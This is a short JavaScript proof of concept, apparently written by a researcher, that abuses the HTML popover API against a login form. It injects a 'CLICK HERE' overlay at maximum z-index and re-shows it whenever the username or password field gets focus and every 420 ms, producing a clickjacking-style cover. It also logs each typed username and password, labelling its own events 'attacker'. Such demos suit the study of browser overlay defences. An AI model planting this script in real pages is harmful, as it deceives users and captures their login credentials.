!(function () {
  document.getElementById("formPopover").showPopover();
  // document.getElementById("formDialog2").showPopover();

  let overEl = document.createElement("div");
  overEl.setAttribute("id", "overEl");
  overEl.setAttribute("popover", "manual");
  overEl.setAttribute(
    "style",
    "pointer-events: none;width: 230px;height: 190px;position: absolute;z-index: 2147483647 !important;text-align: center;line-height: 10rem; font-weight:bold; background-color: rgba(100,0,0,0.7);",
  );
  overEl.innerHTML = "CLICK HERE";

  // let overDia = document.createElement("dialog");
  // overDia.setAttribute("id", "overDia");
  // overDia.setAttribute("role", "dialog");
  // overDia.innerHTML = "CLICK HERE FOR MROE PRIZS!!";
  // document.body.append(overDia);

  document.getElementById("password").addEventListener("input", (event) => {
    console.log(
      `username is ${document.getElementById("username").value} and password is ${document.getElementById("password").value}`,
    );
  });

  function placeOverlay() {
    // console.log('attacker: resetting overlay');
    // document.getElementById("overEl")?.remove();
    document.getElementById("overEl")?.hidePopover();
    document.getElementById("overEl")?.showPopover();
  }

  function stripPopoverAttribute() {
    document.querySelectorAll("[popover]").forEach((e) => {
      e.removeAttribute("popover");
    });
  }

  // const elems = document.getElementsByTagName("*");
  // for (const elem of elems) {
  //   elem.addEventListener(
  //     "click",
  //     placeOverlay,
  //     false,
  //   );
  // }

  document.getElementById("username").addEventListener("focus", placeOverlay);
  document.getElementById("password").addEventListener("focus", placeOverlay);

  document.body.prepend(overEl);
  document
    .getElementById("overEl")
    .addEventListener("toggle", (event) =>
      console.log("attacker: toggle event emitted!"),
    );
  // setTimeout(() => {
  //   setTimeout(placeOverlay, 1);
  // }, 200);

  setInterval(() => {
    // console.log('querySelectorAll(:modal, :popover-open)', document.querySelectorAll(':modal, :popover-open'))
    placeOverlay();
    // stripPopoverAttribute();
  }, 420);
})();
